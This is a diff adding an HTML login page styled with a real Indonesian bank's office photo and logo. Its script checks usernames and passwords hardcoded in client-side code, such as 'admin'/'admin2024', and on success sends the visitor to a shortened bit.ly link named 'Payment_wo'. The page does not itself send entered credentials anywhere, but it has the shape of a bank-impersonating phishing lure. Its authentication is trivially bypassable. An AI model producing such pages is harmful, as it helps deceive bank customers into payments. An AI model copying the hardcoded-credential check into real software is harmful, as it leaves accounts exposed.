@@ -1,0 +1,128 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Login Page</title>
+    <style>
+        /* Background image for the page */
+        body {
+            font-family: Arial, sans-serif;
+            background: url('https://upload.wikimedia.org/wikipedia/commons/b/b7/Foto_kantor_KB_Bukopin.png') no-repeat center center fixed;
+            background-size: cover;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            height: 100vh;
+            margin: 0;
+            color: white;
+        }
+
+        /* Styling for the login box */
+        .login-box {
+            background: rgba(0, 0, 0, 0.7);
+            padding: 30px;
+            border-radius: 10px;
+            width: 300px;
+            text-align: center;
+        }
+
+        input {
+            width: 100%;
+            padding: 10px;
+            margin: 10px 0;
+            border: 1px solid #ddd;
+            border-radius: 5px;
+        }
+
+        button {
+            width: 100%;
+            padding: 10px;
+            background-color: #4CAF50;
+            color: white;
+            border: none;
+            border-radius: 5px;
+        }
+
+        /* Styling for social login buttons */
+        .social-login {
+            display: flex;
+            justify-content: space-between;
+            margin-top: 20px;
+        }
+
+        .social-login button {
+            width: 48%;
+            background-color: #db4437; /* Default Google red */
+            color: white;
+            border: none;
+            border-radius: 5px;
+        }
+
+        .social-login .line {
+            background-color: #00C300; /* LINE green */
+        }
+
+        h2 {
+            color: white;
+            font-size: 24px;
+            margin-bottom: 20px;
+        }
+    </style>
+</head>
+<body>
+    
+    <img src="https://upload.wikimedia.org/wikipedia/commons/0/0c/KB_Bank.png" alt="https://id.m.wikipedia.org/wiki/Berkas:KB_Bank.png">	
+
+    <div class="login-box">
+    <h2>Login</h2>
+    <form id="loginForm" method="POST">
+        <input type="text" id="username" name="username" placeholder="Username" required>
+        <input type="password" id="password" name="password" placeholder="Password" required>
+        <button type="submit">Login</button>
+    </form>
+    
+    <div class="social-login">
+        <button onclick="googleLogin()">Login with Google</button>
+        <button class="line" onclick="lineLogin()">Login with LINE</button>
+    </div>
+</div>
+
+<script>
+    // Simulasi login dengan ID dan Password tertanam
+    const validCredentials = [
+        { username: 'joker', password: 'password123' },
+        { username: 'admin', password: 'admin2024' },
+        { username: 'user123', password: 'userpass567' }
+    ];
+
+    document.getElementById("loginForm").onsubmit = function(event) {
+        event.preventDefault();
+        var username = document.getElementById("username").value;
+        var password = document.getElementById("password").value;
+
+        // Cek kredensial yang tertanam di kode
+        var validLogin = validCredentials.some(function(cred) {
+            return cred.username === username && cred.password === password;
+        });
+
+        if (validLogin) {
+            window.location.href = "https://bit.ly/Payment_wo"; // Arahkan ke URL setelah login berhasil    
+        } else {
+            alert("Invalid credentials!");
+        }
+    };
+
+    function googleLogin() {
+        // Logic untuk login Google, implementasikan OAuth Google di sini
+        window.location.href = "https://accounts.google.com/o/oauth2/v2/auth"; // Pengalihan ke login Google
+    }
+
+    function lineLogin() {
+        // Logic untuk login LINE, implementasikan OAuth LINE di sini
+        window.location.href = "https://access.line.me/oauth2/v2.1/authorize"; // Pengalihan ke login LINE
+    }
+</script>
+
+</body>
+</html>
